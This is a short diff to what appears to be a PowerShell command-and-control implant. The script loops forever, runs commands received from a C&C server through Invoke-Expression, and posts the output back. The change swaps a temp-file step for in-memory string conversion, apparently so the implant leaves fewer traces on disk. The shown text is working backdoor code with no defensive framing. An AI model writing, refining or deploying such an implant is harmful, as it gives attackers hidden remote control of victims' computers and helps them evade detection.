@@ -12,13 +12,9 @@ while ($true)
 
     # 2. Execute the command
     $commandResult = Invoke-Expression ($commndToExecute.Content)
-
-    # 3. Write the results of the command to command_result.tmp.
-    #    This touches the disk, but simplifies this code.  Otherwise we'd need to convert the returning object to a string.
-    $commandResult | Out-File $env:TEMP\command_result.tmp
-
-    #    Read the results, this time as plain text
-    $commandResultText = Get-Content $env:TEMP\command_result.tmp
+    
+    # 3. Convert the results to plain text so that they can be easily posted to the C&C
+    $commandResultText = $commandResult | Out-String
 
     # 4. POST the results (content of command_result.tmp) to the C&C
     $postParams = @{results=$commandResultText}
